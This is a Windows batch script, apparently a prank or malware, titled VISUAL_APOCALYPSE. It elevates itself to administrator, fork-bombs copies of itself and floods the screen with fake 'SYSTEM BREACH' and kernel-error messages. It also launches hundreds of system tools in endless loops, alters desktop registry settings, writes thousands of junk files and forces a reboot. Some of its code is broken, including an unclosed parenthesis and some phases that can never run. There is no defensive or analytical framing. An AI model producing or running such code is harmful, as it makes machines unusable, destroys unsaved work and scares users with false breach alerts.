@echo off
title VISUAL_APOCALYPSE
:: Configuración inicial para máxima disrupción
@mode con: cols=150 lines=50
color 0c

:: Auto-elevación para máxima权限
if not "%1"=="_ADMIN" (
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\" _ADMIN' -Verb RunAs"
    exit /b
)

:: Iniciar ataque de replicación masiva (carga visual inmediata)
for /l %%i in (1,1,50) do (
    start /min cmd /k "%~f0 _ADMIN"
    start /min powershell -Command "for($i=0;$i -lt 100;$i++){Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('SYSTEM BREACH DETECTED', 'CRITICAL ERROR', 'OK', 'Error')}"
)

:: Bucle principal de caos total
:apocalypse_loop
:: Fase 1: Bomba de mensajes masiva y concurrente
start /min cmd /c "for /l %%a in () do (msg * \"ERROR FATAL: 0xC000021A\" & msg * \"CORRUPTION DETECTED IN KERNEL\" & msg * \"MEMORY DUMP INITIATED\" & timeout /t 0.1 /nobreak >nul)"

:: Fase 2: Aplicación tormenta (lanzar todo lo posible)
:app_storm
for /l %%b in (1,1,100) do (
    start notepad
    start mspaint
    start calc
    start cmd
    start powershell
    start taskmgr
    start regedit
    start msconfig
    start services.msc
    start eventvwr
    start perfmon
    start resmon
    start control
    start explorer
    timeout /t 0.01 /nobreak >nul
)
goto app_storm

:: Fase 3: Ataque de consola (ejecutado en paralelo)
powershell -Command "& {$wshell = New-Object -ComObject wscript.shell; for($i=0; $i -lt 1000; $i++) {$wshell.SendKeys('{CAPSLOCK}'); $wshell.SendKeys('{NUMLOCK}'); $wshell.SendKeys('{SCROLLLOCK}'; Start-Sleep -Milliseconds 10}}"

:: Fase 4: Inversión de pantalla y colores aleatorios
powershell -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class User32 { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uiAction, int uiParam, IntPtr pvParam, int fWinIni); }'; while($true) { [User32]::SystemParametersInfo(20, 0, [IntPtr]::Zero, 0x01 | 0x02); Start-Sleep -Milliseconds 200; [User32]::SystemParametersInfo(20, 0, [IntPtr]::Zero, 0x01 | 0x02); Start-Sleep -Milliseconds 200 }"

:: Fase 5: Escritorio vivo (modificación continua del registro)
:desktop_chaos
for /l %%c in (1,1,10) do (
    reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v Background /t REG_SZ /d "%random% %random% %random%" /f
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
    RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
    timeout /t 0.5 /nobreak >nul
)
goto desktop_chaos

:: Fase 6: Escritura de basura en pantalla (efecto matrix)
powershell -Command "$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(150,50); while($true) { $random_string = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 150 | ForEach-Object {[char]$_}); Write-Host $random_string -ForegroundColor $([System.ConsoleColor]::GetValues('System.ConsoleColor') | Get-Random) -NoNewline }"

:: Fase 7: Tormenta de audio
powershell -Command "while($true) { (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Critical Stop.wav').PlaySync(); (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Hardware Fail.wav').PlaySync(); (New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Error.wav').PlaySync() }"

:: Fase 8: Creación de archivos basura masiva
powershell -Command "for($i=0; $i -lt 10000; $i++) { 'CHAOS_DATA_' + $i + '_CORRUPTED' | Out-File -FilePath \"$env:TEMP\\chaos_$i.tmp\" -Encoding ASCII }"

:: Fase 9: Reinicio forzado con cuenta regresiva visual
shutdown /r /t 120 /c "VISUAL_APOCALYPSE COMPLETE. SYSTEM SHUTDOWN IN 120 SECONDS. ALL YOUR BASE ARE BELONG TO US."

:: Fase 10: Mensajes finales de pánico
:final_panic
for /l %%d in (1,1,50) do (
    msg * "¡¡¡SISTEMA PERDIDO!!!" & timeout /t 0.5 /nobreak >nul
    msg * "ERROR 999: REALIDAD COMPROMETIDA" & timeout /t 0.5 /nobreak >nul
    msg * "INICIANDO SECuencia DE AUTODESTRUCCIÓN" & timeout /t 0.5 /nobreak >nul
)
goto final_panic

goto apocalypse_loop